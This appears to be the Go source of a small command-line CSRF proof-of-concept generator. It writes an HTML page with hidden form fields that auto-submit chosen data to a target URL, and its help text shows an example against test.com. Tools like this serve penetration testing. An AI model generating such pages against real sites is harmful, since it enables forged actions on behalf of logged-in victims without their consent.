package poc

import (
	"fmt"
	"os"
	"strings"
)

/*
Type
0 - multipart/form-data
1 - application/x-www-form-urlencoded
2 - multipart/plain
*/

func GetEncodigHTML() []string {
	return []string{"multipart/form-data", "application/x-www-form-urlencoded", "multipart/plain"}
}

/*
Type
0 - GET
1 - HEAD
2 - POST
*/

func GetMethod() []string {
	return []string{"GET", "HEAD", "POST"}
}

/*
return html code
*/

func ReturnHTML(method string, encoding string, data string, url string) {
	dataEdit := strings.Split(data, "&")
	input := ""
	for i := 0; i < len(dataEdit); i++ {
		singleData := strings.Split(dataEdit[i], "=")
		input += "<input type=\"text\" value=\"" + singleData[1] + "\" name=\"" + singleData[0] + "\" hidden>"
	}
	htmlCode := "<html><form enctype=\"" + encoding + "\" method=\"" + method + "\" action=\"" + url + "\"> " + input + " <input type=\"submit\" value=\"SEND PoC " + url + "\"></form></html>"

	urlClean := strings.Split(url, ".")
	urlClean = strings.Split(urlClean[0], ":")
	urlClean = strings.Split(urlClean[1], "//")

	f, err := os.Create("CSRF_POC_" + urlClean[1] + ".html")
	if err != nil {
		panic(err)
	}
	defer f.Close()
	_, err = f.WriteString(htmlCode)
	if err != nil {
		panic(err)
	}
	fmt.Println("CSRF_POC_" + urlClean[1] + ".html was created!")

}

func Help() {
	fmt.Println("[+]CSRF PoC Generator by ☠️簡克斯特爾☠️ - 2023 - V 1.0")
	fmt.Println("[+]csrf_poc_generator -h => help")
	fmt.Println("[+]csrf_poc_generator method encodig url data")
	fmt.Print("[+]method: \n \t\t0 = GET \n\t\t1 = HEAD \n\t\t2 = POST\n")
	fmt.Print("[+]encodig: \n \t\t0 = multipart/form-data \n\t\t1 = application/x-www-form-urlencoded \n\t\t2 = multipart/plain\n")
	fmt.Print("[+]url: your target\n")
	fmt.Print("[+]data: your data\n")
	fmt.Println("[+]Exemple:")
	fmt.Println("[+]csrf_poc_generator 2 1 https://test.com/test/test.php value1=100000&value2=sem")

}
